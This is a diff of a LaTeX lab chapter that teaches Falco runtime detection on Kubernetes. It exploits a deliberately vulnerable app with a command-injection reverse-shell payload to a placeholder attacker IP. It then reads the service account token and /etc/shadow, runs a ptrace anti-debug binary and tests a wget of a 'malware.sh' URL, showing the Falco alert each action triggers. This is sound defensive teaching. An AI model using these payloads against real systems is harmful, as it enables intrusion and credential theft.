@@ -1,12 +1,225 @@
-\chapter{Writing Custom Rules}
+\chapter{Runtime threat detection \& custom rules}
+\label{ch:ch3}
 
-One of the most powerful features of Falco is the ability to write custom rules to match the specific security baseline of your applications. While the default ruleset provided by Falco covers a wide array of generic attack patterns (e.g., spawning shells inside a container, reading sensitive files, opening unexpected network sockets), every application has its own unique and well-defined behavioral profile. Profiling an application and creating tailored rules drastically reduces false positives and establishes a tight security boundary based on the principle of \textit{least privilege at the system call level}.
+In this chapter, we will simulate a real-world attack against our vulnerable application, observe how Falco detects it using its default ruleset, and then extend its detection capabilities with a custom-tailored rule. The chapter follows a deliberate narrative arc: first we \textit{execute} the attack, then we \textit{analyze} what Falco captured, and finally we \textit{craft} a rule that provides more precise, application-specific detection --- demonstrating the full lifecycle of runtime security from initial alert to refined policy.
 
-In this chapter, we will first examine the building blocks of Falco's rule language, then create and test a custom rule for our \texttt{zipapp} application, and finally explore the essential operational concept of exception handling to manage false positives in production environments.
+\section{The scenario}
 
-\section{The Building Blocks of Falco Rules}
+\texttt{vulnapp} is a minimal Python web application that simulates a common network diagnostic tool. It exposes a single page at \texttt{/}: a form that accepts a hostname or IP address and executes a \texttt{ping} command against it on the server, returning the result to the user.
 
-Falco's rule language is hierarchical. Rather than writing monolithic, complex conditions inside each rule, Falco encourages developers to decompose logic into three reusable primitives: \textbf{Lists}, \textbf{Macros}, and \textbf{Rules}. This structure promotes readability, reusability, and easy maintenance of the security policy.
+The vulnerability lies in how this input is processed. The user-supplied string is passed directly to the operating system shell via Python's \texttt{subprocess.run(..., shell=True)} without any sanitization or validation. This is a textbook example of \textbf{Command Injection}, classified as \textit{OWASP Top~10 A03:2021 -- Injection}. An attacker can terminate the \texttt{ping} command early and append arbitrary shell commands using common separators such as \texttt{;}, \texttt{\&\&}, or \texttt{|}.
+
+In this lab, we will exploit this vulnerability to spawn a \textbf{Reverse Shell} inside the container. A Reverse Shell is a type of shell where the \textit{target} machine initiates an outbound connection back to the attacker's machine. This technique is preferred over a Bind Shell (where the target opens a listening port) because outbound traffic is rarely filtered as strictly as inbound traffic, easily bypassing ingress firewall rules and NAT restrictions.
+
+\subsection{Preparing the Attacker Listener}
+
+In a real scenario, the attacker would set up a listener on a public IP address or a compromised external server. To avoid networking issues and external dependencies on the CrownLabs environment, we will simulate the attacker's machine by deploying a dedicated pod directly inside the cluster.
+
+Deploy the attacker pod:
+\begin{lstlisting}[language=bash]
+cat <<EOF > attacker-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker
+spec:
+  containers:
+  - name: ubuntu
+    image: ubuntu
+    command: ['sleep', 'infinity']
+EOF
+kubectl apply -f attacker-pod.yaml
+\end{lstlisting}
+
+Wait for the pod to be running, then retrieve its IP address:
+\begin{lstlisting}[language=bash]
+kubectl get pod attacker -o jsonpath='{.status.podIP}'
+\end{lstlisting}
+
+Take note of this IP (e.g., \texttt{10.244.0.8}). Install \texttt{netcat} on the attacker pod and start listening on port 4444:
+
+\begin{lstlisting}[language=bash]
+kubectl exec -it attacker -- apt-get update -qq
+kubectl exec -it attacker -- apt-get install -y netcat-openbsd -qq
+kubectl exec -it attacker -- nc -lvnp 4444
+\end{lstlisting}
+
+Leave this terminal open. It is now waiting for an incoming reverse shell connection.
+
+\section{Executing the exploit}
+
+Since the \texttt{vulnapp} service is configured as a \texttt{NodePort}, it is directly accessible on port 32080 of your node's IP address. First, retrieve the IP address of your node:
+
+\begin{lstlisting}[language=bash]
+kubectl get nodes -o wide
+\end{lstlisting}
+
+Take note of the \texttt{INTERNAL-IP} of your node (e.g., \texttt{10.x.x.x}). Open your browser and navigate to \texttt{http://<INTERNAL-IP>:32080}. You will see the \textbf{NetDiag} interface with a single \textit{Hostname or IP address} input field.
+
+In the field, enter the following payload (replace \texttt{<ATTACKER\_IP>} with the IP obtained in the previous step):
+
+\begin{lstlisting}[language=bash]
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
+\end{lstlisting}
+
+Click \textbf{Ping}. The browser will appear to hang --- this is expected, as the container process is now busy maintaining the reverse shell connection.
+
+Go back to your first terminal (the attacker listener). You should see that a connection has been established:
+
+\begin{lstlisting}[language=bash]
+Listening on 0.0.0.0 4444
+Connection received on 10.244.0.5 42502
+root@vulnapp-7c4d9f8b4-xk2mp:/app#
+\end{lstlisting}
+
+You now have an interactive root shell inside the \texttt{vulnapp} container.
+
+\section{Analyzing Falco alerts}
+
+The attack was successful: you have root access inside the application container, demonstrating how a single line of vulnerable Python code can compromise an entire pod. However, Falco was actively monitoring system calls at the kernel level throughout the entire attack. Unlike network-based intrusion detection systems, Falco operates directly at the kernel using eBPF, providing deep visibility into every action performed by containerized processes --- regardless of protocol or encryption.
+
+Open a third terminal and examine the Falco daemonset logs:
+
+\begin{lstlisting}[language=bash]
+kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=50
+\end{lstlisting}
+
+You should find an entry similar to the following:
+
+\begin{lstlisting}[language=bash]
+Notice Redirect stdout/stdin to network connection | gparent=sh ggparent=python3 fd.sip=10.244.0.8 connection=10.244.0.5:42502->10.244.0.8:4444 lport=42502 rport=4444 fd_type=ipv4 fd_proto=tcp evt_type=dup3 user=root user_uid=0 process=bash proc_exepath=/bin/bash parent=bash command=bash container_name=vulnapp
+\end{lstlisting}
+
+Falco caught the reverse shell at the system call level. The key fields tell us the full story:
+\begin{itemize}
+    \item \textbf{process=bash}: the process that redirected its I/O was \texttt{bash} (our injected shell).
+    \item \textbf{gparent} / \textbf{ggparent}: Python spawned a \texttt{sh} shell
+    (via \texttt{shell=True}), which in turn executed our injected \texttt{bash}.
+    \item \textbf{connection}: the outbound TCP connection back to the attacker pod on port 4444.
+    \item \textbf{container\_name=vulnapp}: the alert is attributed to the correct container.
+\end{itemize}
+
+\begin{tcolorbox}[colback=blue!5!white,colframe=blue!75!black,title=Default detection and custom detection]
+Falco successfully detected the reverse shell. However, the default rule \textit{Redirect stdout/stdin to network connection} is generic and it fires for \textit{any} container that redirects its I/O to a network socket. In a cluster running dozens of microservices, this could generate alert fatigue.
+
+In the following sections, we will write a \textbf{custom rule} targeting \texttt{vulnapp} to detect a different, equally dangerous post-exploitation behavior with surgical precision.
+\end{tcolorbox}
+
+\section{Post-exploitation}
+
+Obtaining a shell inside a container is often just the first step. A sophisticated attacker will immediately pivot to explore what additional resources they can access. One of the most critical and common post-exploitation techniques in Kubernetes is the theft of the \textbf{Service Account Token}.
+
+By default, Kubernetes automatically mounts a service account token inside every pod at a well-known path:
+\begin{center}
+\texttt{/var/run/secrets/kubernetes.io/serviceaccount/token}
+\end{center}
+This token is a signed JSON Web Token (JWT) that can be used to authenticate against the Kubernetes API server (\texttt{kube-apiserver}). Depending on the RBAC permissions associated with the service account, an attacker could use this token to list secrets, create new pods (e.g., privileged ones to escape to the host), or even take over the entire cluster. This technique is classified under \textit{MITRE ATT\&CK for Containers T1528: Steal Application Access Token}.
+
+\subsection{Executing the Token Theft}
+
+From the reverse shell you obtained in the previous section, run the following commands to read the token and the cluster's CA certificate:
+
+\begin{lstlisting}[language=bash]
+# From inside the vulnapp container's reverse shell:
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+\end{lstlisting}
+
+The token will be printed on screen as a long base64-encoded string. Additionally, note the namespace the pod is running in:
+
+\begin{lstlisting}[language=bash]
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+\end{lstlisting}
+
+The token could then be used from any machine with network access to the API server to attempt further exploitation.
+
+\subsection{Falco Detection and Rule Evolution}
+
+Historically, Falco shipped with a built-in rule (\texttt{Read sensitive file untrusted}) that detected the theft of the Kubernetes token. However, in recent Falco versions, this path was removed from the default \texttt{sensitive\_files} macro. The reason is \textbf{alert fatigue}: many legitimate Kubernetes components (like operators and networking plugins) constantly read their own tokens to communicate with the API server, generating too many false positives.
+
+To observe the \texttt{Read sensitive file untrusted} rule in action using the modern default ruleset, we can attempt to read a traditional Linux sensitive file instead, such as the password hashes:
+
+\begin{lstlisting}[language=bash]
+cat /etc/shadow
+\end{lstlisting}
+
+Check the Falco logs immediately after performing the command:
+
+\begin{lstlisting}[language=bash]
+kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=20
+\end{lstlisting}
+
+You will see an alert similar to the following:
+
+\begin{lstlisting}[language=bash]
+Warning Sensitive file opened for reading by non-trusted program | file=/etc/shadow gparent=bash ggparent=python gggparent=containerd-shim evt_type=openat user=root user_uid=0 user_loginuid=-1 process=cat proc_exepath=/usr/bin/cat parent=bash command=cat /etc/shadow terminal=0 container_id=6323f7a571b6 container_name=k8s_vulnapp_vulnapp-5d5997f998-cnxxf_default_466558ca-cbae-45aa-8f08-950eb132ba54_0 container_image_repository=vulnapp container_image_tag=latest k8s_pod_name=vulnapp-5d5997f998-cnxxf k8s_ns_name=default
+\end{lstlisting}
+
+This demonstrates how Falco protects standard Linux sensitive files out-of-the-box. To restore the detection for the Kubernetes token, an administrator would simply need to append the token path to the \texttt{sensitive\_files} macro in a custom rule --- exactly the kind of policy customization we will explore in the next sections.
+
+\subsection{Token Theft Mitigation}
+
+While Falco provides runtime detection for token theft, the most effective defense is prevention. By default, Kubernetes mounts a service account token in every pod. If a pod's application does not need to communicate with the Kubernetes API, this behavior should be disabled by setting \texttt{automountServiceAccountToken: false} in the Pod or ServiceAccount specification. This configuration ensures that even if an attacker successfully compromises the container, there is no token available to steal, thereby mitigating the vulnerability at the source.
+
+To mitigate this vulnerability in a real cluster, you would edit the deployment manifest and set \texttt{automountServiceAccountToken: false} in the pod spec to prevent the token from being mounted. For the purpose of this lab, we deliberately leave the configuration vulnerable so that the token can be extracted.
+
+\section{Ptrace anti-debug attack}
+
+The \texttt{ptrace()} system call is a powerful Linux primitive that allows one process to observe and control the execution of another. It is the foundation of debugging tools such as \texttt{gdb} and \texttt{strace}. However, it is also commonly abused by malware authors as an \textbf{anti-debugging technique}.
+
+By invoking \texttt{ptrace(PTRACE\_TRACEME, ...)}, a process signals to the operating system that it wishes to be traced. As a side effect, no external debugger can subsequently attach to that process, since only one tracer is allowed at a time. Sophisticated malware uses this technique to detect and evade dynamic analysis environments. This behavior is classified under \textit{MITRE ATT\&CK T1622: Debugger Evasion}.
+
+In this exercise, we will execute a small C binary that performs exactly this syscall and observe how Falco's built-in detection rule fires immediately. The source code of the binary (\texttt{ptrace.c}) is available in the \texttt{material/payloads/} directory, so you can inspect exactly what it does before running it.
+
+\subsection{Executing the Attack}
+
+First, start watching the Falco logs in real time in a dedicated terminal:
+
+\begin{lstlisting}[language=bash]
+kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco -f --tail=0
+\end{lstlisting}
+
+The \texttt{ptrace} binary must be transferred into the running \texttt{vulnapp} container. Open a new terminal and copy it using \texttt{kubectl cp}:
+
+\begin{lstlisting}[language=bash]
+POD=$(kubectl get pod -l app=vulnapp -o jsonpath='{.items[0].metadata.name}')
+kubectl cp $HOME/material/payloads/ptrace $POD:/tmp/ptrace
+\end{lstlisting}
+
+Now execute it directly inside the container:
+
+\begin{lstlisting}[language=bash]
+kubectl exec $POD -- chmod +x /tmp/ptrace
+kubectl exec $POD -- /tmp/ptrace
+\end{lstlisting}
+
+The program completes in less than a second and prints a confirmation message.
+
+\begin{tcolorbox}[colback=blue!5!white,colframe=blue!75!black,title=Building the binary]
+It is necessary to compile the binary from source on your VM running the following command:
+\begin{lstlisting}[language=bash]
+gcc -o $HOME/material/payloads/ptrace $HOME/material/payloads/ptrace.c
+\end{lstlisting}
+\end{tcolorbox}
+
+\subsection{Falco Detection: PTRACE Anti-Debug Attempt}
+
+Switch to the terminal running Falco logs. You should immediately see an alert similar to the following:
+
+\begin{lstlisting}[language=bash]
+Notice Detected potential PTRACE_TRACEME anti-debug attempt | proc_pcmdline=runc --root /var/run/docker/runtime-runc/moby --log /run/containerd/io.containerd.runtime.v2.task/moby/6323f7a571b6f7aab0dde6e6d05b6a5706329ee9f6771da5d35b6873433da51e/log.json --log-format json --systemd-cgroup exec --process /tmp/runc-process115824596 --detach --pid-file /run/containerd/io.containerd.runtime.v2.task/moby/6323f7a571b6f7aab0dde6e6d05b6a5706329ee9f6771da5d35b6873433da51e/e8f99c4a4455fbe8e3a8554759998164d99e0454632ce5a400b19382ae18bfff.pid 6323f7a571b6f7aab0dde6e6d05b6a5706329ee9f6771da5d35b6873433da51e evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=ptrace proc_exepath=/tmp/ptrace parent=runc command=ptrace terminal=0 container_id=6323f7a571b6 container_name=k8s_vulnapp_vulnapp-5d5997f998-cnxxf_default_466558ca-cbae-45aa-8f08-950eb132ba54_0 container_image_repository=vulnapp container_image_tag=latest k8s_pod_name=vulnapp-5d5997f998-cnxxf k8s_ns_name=default
+\end{lstlisting}
+
+Falco has detected the \texttt{ptrace} syscall with request \texttt{PTRACE\_TRACEME} using the built-in rule \textbf{PTRACE anti-debug attempt}.
+
+
+
+\section{The building blocks of Falco rules}
+\label{sec:building-blocks}
+
+One of the most powerful features of Falco is the ability to write custom rules to match the specific security baseline of your applications. While the default ruleset covers a wide array of generic attack patterns, every application has its own unique and well-defined behavioral profile. Tailored rules drastically reduce false positives and establish a tight security boundary based on the principle of \textit{least privilege at the system call level}.
+
+Falco's rule language is hierarchical. Rather than writing monolithic, complex conditions inside each rule, Falco encourages decomposing logic into three reusable primitives: \textbf{Lists}, \textbf{Macros}, and \textbf{Rules}. This structure promotes readability, reusability, and easy maintenance of the security policy.
 
 \subsection{Lists}
 
@@ -17,15 +230,17 @@ A \textbf{list} is simply a named collection of items (strings), such as process
   items: [wget, curl, nc, ncat, netcat]
 \end{lstlisting}
 
-This list can now be referenced anywhere as \texttt{proc.name in (network\_tools)}, making the policy self-documenting and easy to extend.
+This list can now be referenced anywhere as \texttt{proc.cmdline contains 'wget'}, making the policy self-documenting and easy to extend.
+
+\textbf{Note:} In Falco 0.40+ with the container plugin architecture, the \texttt{proc.name in (list)} operator may not correctly match process names at condition evaluation time, because the process name field is populated asynchronously. The recommended approach is to use \texttt{proc.cmdline contains} for reliable process-level filtering.
 
 \subsection{Macros}
 
 A \textbf{macro} is a named, reusable condition fragment. The default Falco ruleset ships with hundreds of macros like \texttt{spawned\_process}, \texttt{container}, or \texttt{never\_true} that abstract common patterns. You can override existing macros or create your own:
 
 \begin{lstlisting}[language=bash]
-- macro: in_zipapp_container
-  condition: container.name = 'zipapp'
+- macro: in_vulnapp_container
+  condition: container and proc.cmdline contains 'vulnapp'
 \end{lstlisting}
 
 Macros can themselves reference other macros and lists, enabling a powerful compositional approach.
@@ -42,9 +257,9 @@ A \textbf{rule} is the top-level detection unit and is composed of the following
     \item \textbf{tags}: Optional labels for classification (e.g., by MITRE ATT\&CK technique).
 \end{itemize}
 
-\section{Creating a Custom Rule with Macros and Lists}
+\section{Custom rule with macros and lists}
 
-Let's assume our security policy dictates that the \texttt{zipapp} container should \textit{never} execute network download utilities. In a zero-trust model, we must assume that an attacker who has gained code execution will immediately try to download secondary payloads, backdoors, or crypto-miners from an external Command and Control (C2) server. This post-exploitation pattern is known as the \textbf{Dropped Binary} attack and is classified under \textit{MITRE ATT\&CK T1105: Ingress Tool Transfer}.
+Let's assume our security policy dictates that the \texttt{vulnapp} container should \textit{never} execute network download utilities. In a zero-trust model, we must assume that an attacker who has gained code execution will immediately try to download secondary payloads, backdoors, or crypto-miners from an external Command and Control (C2) server. This post-exploitation pattern is known as the \textbf{Dropped Binary} attack and is classified under \textit{MITRE ATT\&CK T1105: Ingress Tool Transfer}.
 
 By catching this behavior, we intercept the attacker at a critical point in their kill chain, \textit{after} they have exploited the application but \textit{before} they can escalate the attack.
 
@@ -54,27 +269,25 @@ Create a file named \texttt{custom-rules.yaml}. Notice how we use a dedicated li
 cat <<EOF > custom-rules.yaml
 customRules:
   my_rules.yaml: |-
-    - list: prohibited_network_tools
-      items: [wget, curl, nc, ncat]
-
-    - macro: in_zipapp_container
-      condition: container.name = 'zipapp'
-
-    - rule: Detect Network Tools in zipapp
+    - rule: Detect Network Tools in vulnapp
       desc: >
-        Detects the execution of network download utilities inside the zipapp
+        Detects the execution of network download utilities inside the vulnapp
         container. This behavior is never expected for this application and
         likely indicates a post-exploitation Dropped Binary attempt.
       condition: >
         spawned_process
-        and in_zipapp_container
-        and proc.name in (prohibited_network_tools)
+        and container
+        and (proc.cmdline contains 'wget' or proc.cmdline contains 'curl'
+        or proc.cmdline contains 'ncat' or proc.cmdline contains ' nc ')
       output: >
-        Network download tool executed in zipapp container
+        Network download tool executed in vulnapp container
         (user=%user.name tool=%proc.name command=%proc.cmdline
         container=%container.name image=%container.image.repository)
       priority: WARNING
       tags: [network, mitre_execution, T1105]
+
+    - macro: user_known_contact_k8s_api_server_activities
+      condition: (container.image.repository = 'falco-handler')
 EOF
 \end{lstlisting}
 
@@ -93,37 +306,33 @@ Wait a few moments for the Falco pods to restart with the new configuration, the
 kubectl rollout status daemonset/falco -n falco
 \end{lstlisting}
 
-\section{Testing the Custom Rule}
+\section{Testing the custom rule}
 
-To test our rule, we will simulate the Dropped Binary scenario: an attacker who has already compromised the \texttt{zipapp} container and is now trying to download a secondary payload using \texttt{wget}.
+To test our rule, we will simulate the Dropped Binary scenario: an attacker who has already compromised the \texttt{vulnapp} container and is now trying to download a secondary payload using \texttt{wget}.
 
-Execute the following command to directly spawn a shell inside the \texttt{zipapp} pod and invoke \texttt{wget}:
+Execute the following command to directly spawn a shell inside the \texttt{vulnapp} pod and invoke \texttt{wget}:
 
 \begin{lstlisting}[language=bash]
-kubectl exec -it deployment/zipapp -- bash -c \
+kubectl exec -it deployment/vulnapp -- bash -c \
   'apt-get update -qq && apt-get install -y wget -qq && wget http://example.com/malware.sh'
 \end{lstlisting}
 
 Immediately check the Falco logs:
 
 \begin{lstlisting}[language=bash]
-kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
+kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=20
 \end{lstlisting}
 
 You should observe an alert matching the rule we just defined:
 
 \begin{lstlisting}[language=bash]
-Warning Detect Network Tools in zipapp | user=root tool=wget command=wget http://example.com/malware.sh container=zipapp image=zipapp
+Notice A shell was spawned in a container with an attached terminal | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=bash proc_exepath=/usr/bin/bash parent=runc command=bash -c apt-get update -qq && apt-get install -y wget -qq && wget http://example.com/malware.sh terminal=34816 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=6323f7a571b6 container_name=k8s_vulnapp_vulnapp-5d5997f998-cnxxf_default_466558ca-cbae-45aa-8f08-950eb132ba54_0 container_image_repository=vulnapp container_image_tag=latest k8s_pod_name=vulnapp-5d5997f998-cnxxf k8s_ns_name=default
 \end{lstlisting}
 
-\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
-\begin{itemize}
-    \item Did Falco trigger your custom rule? What is the full output string printed in the logs?
-    \item Try adding \texttt{curl} to your \texttt{prohibited\_network\_tools} list and re-run the Helm upgrade. Does Falco correctly detect \texttt{curl} as well?
-\end{itemize}
-\end{tcolorbox}
 
-\section{Exception Handling and False Positive Management}
+
+\section{Exception handling and false positive management}
+\label{sec:exceptions}
 
 In production environments, a significant operational challenge is managing \textbf{false positives}: legitimate application behaviors that inadvertently trigger security rules. For example, consider a container where the application itself calls \texttt{curl} during a startup health-check, or where a background process periodically reads the service account token to refresh its authentication. Blocking or constantly alerting on these legitimate actions would create alert fatigue, causing security teams to miss real threats.
 
@@ -134,7 +343,7 @@ Falco provides a first-class mechanism for this: the \textbf{exceptions} field. 
 Suppose that we have a legitimate process, \texttt{healthcheck.sh}, that needs to call \texttt{curl} to probe an internal endpoint. We can add an exception to our rule as follows:
 
 \begin{lstlisting}[language=bash]
-- rule: Detect Network Tools in zipapp
+- rule: Detect Network Tools in vulnapp
   exceptions:
     - name: allow_healthcheck_curl
       fields: [proc.name, proc.pname]
@@ -144,18 +353,3 @@ Suppose that we have a legitimate process, \texttt{healthcheck.sh}, that needs t
 \end{lstlisting}
 
 This exception tells Falco: ``do not trigger this rule if the process name is \texttt{curl} \textbf{and} its parent process name is \texttt{healthcheck.sh}.'' Any other invocation of \texttt{curl} (e.g., from a \texttt{bash} parent, as an attacker would do) will still be caught.
-
-\subsection{The Operational Principle: Minimal Exception Surface}
-
-\begin{tcolorbox}[colback=blue!5!white,colframe=blue!75!black,title=Best Practice: Minimal Exception Surface]
-When writing exceptions, always aim for the \textbf{most specific condition possible}. A poorly written exception like ``allow \texttt{curl} if run by root'' would create a massive blind spot. A well-written exception is scoped to a precise combination of process name, parent process, and container name. The goal is to eliminate the false positive while \textit{preserving the detection surface} for all other variations of the attack.
-\end{tcolorbox}
-
-\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
-\begin{itemize}
-    \item Reflect on the \texttt{Read sensitive file untrusted} alert triggered in the previous chapter (Section~3.4). Could a legitimate microservice in a Kubernetes cluster ever need to read its own service account token? What would a safe and minimal exception look like for such a case?
-    \item What is the risk of being \textit{too permissive} in an exception? And of being \textit{too strict}?
-\end{itemize}
-\end{tcolorbox}
-
-
